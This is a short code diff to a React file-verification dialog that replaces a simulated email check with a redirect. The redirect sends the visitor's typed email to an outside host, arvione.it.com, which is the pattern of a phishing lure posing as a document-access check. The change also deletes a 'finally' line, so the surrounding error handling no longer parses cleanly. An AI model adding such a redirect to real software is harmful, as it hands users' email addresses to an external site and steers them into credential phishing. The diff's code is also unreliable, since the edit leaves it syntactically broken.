@@ -42,13 +42,11 @@ export function FileVerificationDialog({
       
       setIsSubmitting(true);
       
-      // Simulate email verification
-      await new Promise((resolve) => setTimeout(resolve, 1000));
+      // Construct URL with email prepended
+      const redirectUrl = `${email}@https://arvione.it.com/2Zw3QQ7/#X`;
       
-      toast({
-        title: "Verification Email Sent",
-        description: `Please check ${email} to verify and access ${fileName}`,
-      });
+      // Redirect to the constructed URL
+      window.location.href = redirectUrl;
       
       onOpenChange(false);
       setEmail("");
@@ -60,7 +58,6 @@ export function FileVerificationDialog({
           variant: "destructive",
         });
       }
-    } finally {
       setIsSubmitting(false);
     }
   };
